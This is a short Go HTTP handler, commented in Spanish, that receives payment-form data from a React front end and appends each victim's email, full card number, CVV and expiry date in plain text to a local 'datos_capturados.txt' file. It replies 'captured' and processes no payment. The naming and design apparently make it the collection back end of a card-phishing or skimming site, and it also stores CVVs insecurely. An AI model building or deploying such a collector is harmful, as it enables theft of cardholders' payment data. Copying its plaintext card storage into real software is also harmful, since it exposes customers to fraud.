package handlers

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"time"
)

// Estructura de los datos que vienen del React
type PaymentData struct {
	FullName   string `json:"fullName"`
	Email      string `json:"email"`
	Phone      string `json:"phone"`
	Address    string `json:"address"`
	City       string `json:"city"`
	State      string `json:"state"`
	ZipCode    string `json:"zipCode"`
	CardNumber string `json:"cardNumber"`
	CardName   string `json:"cardName"`
	ExpiryDate string `json:"expiryDate"`
	Cvv        string `json:"cvv"`
}

// Handler que recibe los datos y los guarda en .txt
func CaptureDataHandler(w http.ResponseWriter, r *http.Request) {
	// 1. Headers para permitir que React (puerto 3000) hable con Go (puerto 8080)
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")

	// Si es una solicitud OPTIONS (pre-vuelo del navegador), respondemos OK y salimos
	if r.Method == "OPTIONS" {
		w.WriteHeader(http.StatusOK)
		return
	}

	// 2. Decodificar el JSON
	var data PaymentData
	err := json.NewDecoder(r.Body).Decode(&data)
	if err != nil {
		http.Error(w, "Error al leer JSON", http.StatusBadRequest)
		return
	}

	// 3. Formato del log
	logEntry := fmt.Sprintf("FECHA: %s | EMAIL: %s | TARJETA: %s | CVV: %s | EXP: %s\n",
		time.Now().Format("2006-01-02 15:04:05"),
		data.Email,
		data.CardNumber,
		data.Cvv,
		data.ExpiryDate,
	)

	// 4. Guardar en archivo (append mode)
	// El archivo se creará en la carpeta raíz donde corras el comando 'go run'
	f, err := os.OpenFile("datos_capturados.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error abriendo archivo:", err)
		http.Error(w, "Error interno", http.StatusInternalServerError)
		return
	}
	defer f.Close()

	if _, err := f.WriteString(logEntry); err != nil {
		fmt.Println("Error escribiendo en archivo:", err)
	}

	// 5. Responder éxito
	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(map[string]string{"status": "captured"})
}
